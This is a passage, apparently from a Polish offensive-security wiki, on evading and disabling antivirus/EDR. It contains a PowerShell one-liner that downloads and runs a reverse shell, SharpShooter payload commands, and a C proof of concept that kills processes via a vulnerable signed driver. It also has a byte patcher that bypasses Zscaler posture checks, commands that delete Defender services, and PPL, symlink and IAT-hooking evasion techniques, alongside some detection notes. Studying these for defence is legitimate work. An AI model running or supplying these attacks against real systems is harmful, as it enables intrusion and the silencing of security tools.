32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do tworzenia injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Zabijanie AV/EDR z przestrzeni jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe o nazwie **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktów końcowych przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* sterownik** i wykorzystuje go do wykonywania uprzywilejowanych operacji w jądrze, których nie mogą zablokować nawet usługi AV działające jako Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze informacje
1. **Podpisany sterownik**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale binarnie jest to legalnie podpisany sterownik `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ sterownik ma prawidłowy podpis Microsoftu, jest ładowany nawet wtedy, gdy włączone jest Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwsza linia rejestruje sterownik jako **usługę jądra**, a druga go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTLs udostępniane przez sterownik**
   | Kod IOCTL | Możliwość                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu na podstawie PID (używane do zabijania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie sterownika i usunięcie usługi |

   Minimalny proof of concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia trybu użytkownika; kod wykonywany w kernelu może otwierać *chronione* procesy, kończyć je lub manipulować obiektami kernela niezależnie od PPL/PP, ELAM czy innych funkcji wzmacniających zabezpieczenia.

Wykrywanie / łagodzenie skutków
•  Włącz listę blokowanych podatnych sterowników firmy Microsoft (`HVCI`, `Smart App Control`), aby Windows odmawiał załadowania `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych usług *kernela* i generuj alerty, gdy sterownik jest ładowany z katalogu z prawem zapisu dla wszystkich lub nie znajduje się na liście dozwolonych.
•  Monitoruj uchwyty z trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez modyfikowanie binariów na dysku

**Client Connector** firmy Zscaler stosuje lokalnie reguły stanu urządzenia i korzysta z RPC Windows, aby przekazywać wyniki innym komponentom. Dwie słabe decyzje projektowe umożliwiają całkowite obejście zabezpieczeń:

1. Ocena stanu urządzenia odbywa się **w całości po stronie klienta** (na serwer wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC sprawdzają jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Zmodyfikowanie czterech podpisanych binariów na dysku** pozwala zneutralizować oba mechanizmy:

| Binarium | Oryginalna modyfikowana logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się zgodnością |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Minimalny fragment patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają status **zielony/zgodny**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać punkty końcowe RPC nazwanych potoków (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zaatakowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez zasady Zscaler.

To studium przypadku pokazuje, jak za pomocą kilku poprawek bajtów można obejść decyzje dotyczące zaufania podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisów.

## Nadużycie zaufanych funkcji Microsoft Defender `BTR.sys`

Sterownik **Boot-Time Removal** w Defenderze stanowi użyteczny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny, podpisany przez Microsoft komponent naprawczy bez błędu powodującego uszkodzenie pamięci i bez interfejsu IOCTL; po uzyskaniu dostępu administratora i `SeLoadDriverPrivilege` operator może zamiast tego sfałszować jego prywatną transakcję naprawczą i uzyskać dostęp do zamierzonych operacji na plikach/rejestrze w Ring-0. Jest to **prymityw neutralizacji AV/EDR po przejęciu systemu, a nie początkowy dostęp ani eskalacja uprawnień**. Sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` w `MpEngine.dll` znajdującym się na zaatakowanym hoście, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie sterownika jednorazowego użytku

Defender zwykle zapisuje zasób jako plik o losowej nazwie `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany NTFS ADS, odszyfrowuje i weryfikuje listę działań, zapisuje informacje zwrotne, a po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), aby sterownik został wyładowany, zamiast pozostać załadowanym. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden zaszyfrowany blob RC4. Analizowane kompilacje ponownie używają stałego klucza o długości 256 bajtów, więc szyfrowanie nie stanowi granicy autoryzacji. Prawidłowy plaintext ma 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyprowadzony z payloadu), po którym następuje zakończona znakiem null ścieżka feedback w UTF-16 oraz dowolna liczba elementów. Każdy element ma 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) oraz dane zależne od akcji, kończące się **dokładnie czterema bajtami NUL**. Każdy region nagłówka/danych jest sprawdzany niezależnie za pomocą CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest zerowany dla każdego regionu.<sup>[[36]](#references)[[37]](#references)</sup>

Obsługiwane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Rezultat |
| --- | --- | --- |
| 1 | `[ścieżka UTF-16]` | Usuwa plik, w tym zablokowany plik |
| 2 | `[ścieżka UTF-16]` | Usuwa pusty katalog |
| 3 | `[Flagi][źródło][miejsce docelowe]` | Przenosi plik do wybranej przez atakującego chronionej ścieżki; puste miejsce docelowe oznacza usunięcie |
| 4 | `[Flagi][ścieżka klucza]` | Rekurencyjnie usuwa klucz rejestru |
| 5 | `[Flagi][ścieżka klucza + "\\" + wartość]` | Usuwa wartość rejestru |
| 6 | `[Flagi][typ][rozmiar][ścieżka klucza + "\\" + wartość][dane]` | Tworzy/aktualizuje wartość rejestru i tworzy brakujące ścieżki kluczy |

W przypadku akcji 5 i 6 separator klucza/wartości w przesyłanych danych to **dwa następujące po sobie ukośniki odwrotne**; konwencjonalnie sformatowana ścieżka nie zostanie poprawnie podzielona. Plik feedback w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu stają się jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają początkowego pola flag, BTR przesuwa ścieżkę do czterech zarezerwowanych bajtów końcowych, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przepływ pracy `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) realizuje cały łańcuch: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy `<random>.sys:changelist` i strumień feedback, serializuje/sumuje kontrolnie/szyfruje połączone akcje, tworzy bezpośrednio klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` lub pozostawia sterownik jako uruchamiany przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie wpisu w rejestrze omija standardową ścieżkę SCM `CreateServiceW`, dlatego **nie generuje** zdarzenia instalacji usługi o identyfikatorze 7045. Artefakty uruchamiane podczas rozruchu można później usunąć za pomocą `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie jest użyteczne, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i link `SystemRoot` będą gotowe. `Start=1` wraz z grupą o wysokim priorytecie `Boot Bus Extender` powoduje uruchomienie w Phase 1: NTFS działa, ale wiele sterowników zabezpieczeń uruchamianych przy starcie systemu i usług EDR działających w trybie użytkownika nie zostało jeszcze zainicjowanych. Filtry uruchamiane przy starcie systemu, takie jak `WdFilter`, mogą być już załadowane, ale BTR może usunąć ich pliki binarne lub konfigurację usług przed następnym uruchomieniem, a pliki wykonywalne usług — zanim SCM je uruchomi. ELAM nie eliminuje tej luki, ponieważ BTR działa po ocenie sterowników uruchamianych podczas rozruchu i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele działań wykonuje się w ramach jednej transakcji. PoC dodaje jako pierwsze Action 1 dla zakodowanego na stałe pliku `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten plik dziennika, następnie przetwarza własne żądanie usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość śladów, a zapisanie informacji zwrotnej w `<random>.sys:<random>.dat` pozwala usunąć sterownik i oba strumienie jednocześnie.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje o wysokiej wartości detekcyjnej

Reguły oparte wyłącznie na sygnaturach oraz lista zablokowanych podatnych sterowników Microsoftu nie chronią przed nadużyciem zamierzonej funkcjonalności BTR. Preferuj poniższe korelacje behawioralne, odróżniając przy tym legalną linię pochodzenia Defendera od dowolnego programu uruchamiającego.<sup>[[36]](#references)</sup>

- **Sysmon 15:** utworzenie `.sys:changelist` jest nieodłącznym elementem przygotowania BTR. Strumień ADS `.dat` dołączony do tego samego pliku `.sys` jest szczególnie podejrzany, ponieważ Defender zwykle zapisuje informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` i `Group=Boot Bus Extender` z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj załadowanie znanego sterownika BTR spoza linii pochodzenia Defendera z następującym po nim usunięciem pliku przypisanym do `System`/PID 4, szczególnie jeśli chodzi o pliki binarne związane z bezpieczeństwem.
- **Sysmon 11 -> 23:** generuj alerty o szybkim utworzeniu i usunięciu `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ograniczaj i audytuj przydzielanie/włączanie `SeLoadDriverPrivilege`; sam podpis Microsoftu nie wystarcza, by uznać działanie za zaufane, gdy sterownik narzędzia bezpieczeństwa jest przygotowywany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do manipulowania AV/EDR za pomocą LOLBIN-ów

Protected Process Light (PPL) wymusza hierarchię sygnatariuszy i poziomów, dzięki czemu procesy chronione mogą wzajemnie na siebie oddziaływać tylko wtedy, gdy mają równy lub wyższy poziom ochrony. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić plik binarny obsługujący PPL i kontrolować jego argumenty, możesz wykorzystać nieszkodliwą funkcjonalność (np. rejestrowanie) jako ograniczoną, opartą na PPL możliwość zapisu w chronionych katalogach używanych przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (oraz wszystkie załadowane biblioteki DLL) musi być podpisany certyfikatem z EKU obsługującym PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony, odpowiadającego sygnatariuszowi pliku binarnego (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla sygnatariuszy anti-malware, `PROTECTION_LEVEL_WINDOWS` dla sygnatariuszy Windows). Nieprawidłowe poziomy spowodują niepowodzenie tworzenia procesu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Pomocnicze narzędzie open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schemat użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Podpisany plik systemowy `C:\Windows\System32\ClipUp.exe` uruchamia własny proces i przyjmuje parametr określający ścieżkę, pod którą ma zapisać plik dziennika.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi przetwarzać ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

Pomocniki krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (w zarysie)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z flagą `CREATE_PROTECTED_PROCESS`, używając programu uruchamiającego (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki dziennika ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli AV zwykle ma otwarty/zablokowany plik docelowy podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę autostartu, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu zapis z uprawnieniami PPL nastąpi, zanim AV zablokuje swoje pliki binarne, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki zanonimizowane/skrócone dla bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie możesz kontrolować zawartości zapisywanej przez ClipUp, a jedynie jej umiejscowienie; ta metoda nadaje się do uszkadzania, a nie precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi i wykorzystania okna na restart wymagane są lokalne uprawnienia administratora/SYSTEM.
- Kluczowe znaczenie ma czas: docelowy plik nie może być otwarty; wykonanie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Uruchomienie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy jego procesem nadrzędnym są niestandardowe programy uruchamiające, w okolicach rozruchu systemu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych i regularnie uruchamiające się przed Defender/AV. Sprawdź tworzenie/modyfikację usług przed awariami uruchamiania Defendera.
- Monitorowanie integralności plików binarnych/ katalogów Platform Defendera; nieoczekiwane utworzenie/modyfikacje plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz nietypowego użycia poziomu PPL przez pliki binarne niezwiązane z AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w jakim kontekście nadrzędnym; blokuj uruchamianie ClipUp poza uzasadnionymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością ich uruchamiania.
- Upewnij się, że włączono ochronę przed naruszeniami Defendera i ochronę wczesnego uruchamiania; sprawdzaj błędy startowe wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach zawierających narzędzia bezpieczeństwa, jeśli jest to zgodne z wymaganiami środowiska (dokładnie przetestuj).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której działa, przez wyliczenie podfolderów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia stamtąd procesy usługi Defendera (odpowiednio aktualizując ścieżki usługi/rejestru). Ten wybór ufa wpisom katalogu, w tym punktom ponownej analizy katalogów (symlinkom). Administrator może to wykorzystać, aby przekierować Defendera do ścieżki zapisywalnej przez atakującego i uzyskać DLL sideloading lub zakłócić działanie usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Wymagania wstępne
- Lokalny Administrator (wymagany do utworzenia katalogów/symlinków w folderze Platform)
- Możliwość ponownego uruchomienia systemu lub wymuszenia ponownego wyboru platformy Defendera (restart usługi podczas rozruchu)
- Wymagane są tylko wbudowane narzędzia (mklink)

Dlaczego to działa
- Defender blokuje zapisy w swoich własnych folderach, ale jego mechanizm wyboru platformy ufa wpisom katalogu i wybiera najwyższą leksykograficznie wersję bez sprawdzania, czy ścieżka docelowa prowadzi do chronionej/zaufanej lokalizacji.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform dowiązanie symboliczne katalogu o wyższej wersji, wskazujące na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Sprawdź, czy MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinna być widoczna nowa ścieżka procesu `C:\TMP\AV\` oraz konfiguracja usługi/rejestr wskazujące tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Umieść/zastąp pliki DLL ładowane przez Defender z jego katalogu aplikacji, aby wykonywać kod w procesach Defender. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Zatrzymanie usługi/odmowa usługi: Usuń symlink wersji, aby przy następnym uruchomieniu skonfigurowana ścieżka nie była rozpoznawana i Defender nie mógł się uruchomić:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing z PIC (w stylu Crystal Kit)

Red teams mogą przenieść unikanie detekcji w czasie działania z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, niezależny od pozycji kod (PIC). Pozwala to rozszerzyć unikanie detekcji poza niewielki zestaw API udostępnianych przez wiele kitów (np. CreateProcessA) oraz zapewnić te same zabezpieczenia dla BOF-ów i bibliotek DLL używanych w post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście ogólne
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (jako prefiks lub plik towarzyszący). PIC musi być samowystarczalny i niezależny od pozycji.
- Podczas ładowania hostującej biblioteki DLL przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmień wpisy IAT dla wskazanych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na cienkie wrappery PIC.
- Każdy wrapper PIC wykonuje działania unikające detekcji, a następnie przekazuje sterowanie do właściwego adresu API. Typowe działania obejmują:
  - Maskowanie/odmaskowanie pamięci wokół wywołania (np. szyfrowanie obszarów beaconu, zmiana RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
  - Call-stack spoofing: utworzenie wiarygodnego stosu i przejście do docelowego API, tak aby analiza call stacka wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Dla zgodności wyeksportuj interfejs, który umożliwi skryptowi Aggressor (lub odpowiednikowi) rejestrowanie API do hookowania dla Beacon, BOF-ów i bibliotek DLL używanych w post-exploitation.

Dlaczego w tym przypadku warto użyć IAT hooking
- Działa z dowolnym kodem używającym hookowanego importu, bez modyfikowania kodu narzędzia ani polegania na Beaconie w przekazywaniu określonych wywołań API.
- Obejmuje biblioteki DLL używane w post-exploitation: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować do ich wywołań API te same techniki maskowania i unikania analizy stosu.
- Przywraca niezawodne działanie poleceń post-exploitation uruchamiających procesy, gdy wykrywanie opiera się na call stacku, przez opakowanie CreateProcessA/W.

Minimalny szkic IAT hooka (pseudokod C/C++ dla x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relokacjach/ASLR, a przed pierwszym użyciem importu. Reflective loaders, takie jak TitanLdr/AceLdr, pokazują hooking podczas DllMain załadowanego modułu.
- Utrzymuj małe wrappery bezpieczne dla PIC; prawdziwe API rozwiązuj za pomocą oryginalnej wartości IAT przechwyconej przed patchowaniem albo przez LdrGetProcedureAddress.
- W przypadku PIC stosuj przejścia RW → RX i nie pozostawiaj stron z prawami zapisu i wykonywania.

Stub do call-stack spoofing
- Stuby PIC w stylu Draugr budują fałszywy łańcuch wywołań (adresy powrotu w benign modules), a następnie przekazują sterowanie do prawdziwego API.
- Pozwala to ominąć detekcje oczekujące kanonicznych stosów z Beacon/BOFs przy wywołaniach wrażliwych API.
- Połącz tę technikę z stack cutting/stack stitching, aby przed prologiem API znaleźć się w oczekiwanych ramkach.

Integracja operacyjna
- Dodaj reflective loader na początku DLL-i post-ex, aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL.
- Użyj skryptu Aggressor do rejestrowania docelowych API, aby Beacon i BOFs mogły korzystać z tej samej ścieżki evasion bez zmian w kodzie.

Kwestie detekcji/DFIR
- Integralność IAT: wpisy wskazujące na adresy spoza obrazu (heap/anon); okresowa weryfikacja wskaźników importu.
- Anomalie stosu: adresy powrotu nienależące do załadowanych obrazów; nagłe przejścia do PIC spoza obrazu; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy w IAT z wnętrza procesu, wczesna aktywność DllMain modyfikująca thunki importu, nieoczekiwane regiony RX tworzone podczas ładowania.
- Omijanie image-load: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania assembly automation/clr skorelowane ze zdarzeniami maskowania pamięci.

Powiązane elementy i przykłady
- Reflective loaders wykonujące patchowanie IAT podczas ładowania (np. TitanLdr, AceLdr)
- Hooki memory masking (np. simplehook) i PIC do stack cutting (stackcutting)
- Stuby PIC do call-stack spoofing (np. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hooki IAT podczas importu za pośrednictwem rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera `GetProcAddress` własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **rezydentny PICO** (trwały obiekt PIC), który pozostanie po zwolnieniu pamięci przez tymczasowy PIC loadera.
- Udostępnij funkcję `setup_hooks()`, która nadpisze resolver importu loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy ordinalne i użyj wyszukiwania hooków na podstawie hash, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie przekaż wywołanie do prawdziwego `GetProcAddress`.
- Zarejestruj docelowe hooki podczas linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostanie poprawny, ponieważ znajduje się w rezydentnym PICO.

